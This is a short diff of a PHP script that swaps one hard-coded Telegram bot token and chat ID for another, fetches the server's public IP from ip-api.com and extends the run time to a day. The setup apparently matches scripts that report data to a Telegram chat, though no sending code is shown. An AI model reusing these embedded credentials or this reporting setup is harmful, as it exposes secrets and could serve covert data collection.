@@ -1,6 +1,6 @@
 <?php
-	$token = "1864318629:AAEw13BttHPrb7p98RTyM682aDCIB7kCJZI";
-	$chat_id = "1742761281";
+	$token = "5351655513:AAGV6UoNzN-SANQyvi1L1os9X5lEEZL8wUQ";
+	$chat_id = "5388862175";
 	$json = $json = json_decode(file_get_contents('http://ip-api.com/json/'),true);
 	$ip = $json['query'];
 	set_time_limit(3600 * 24);
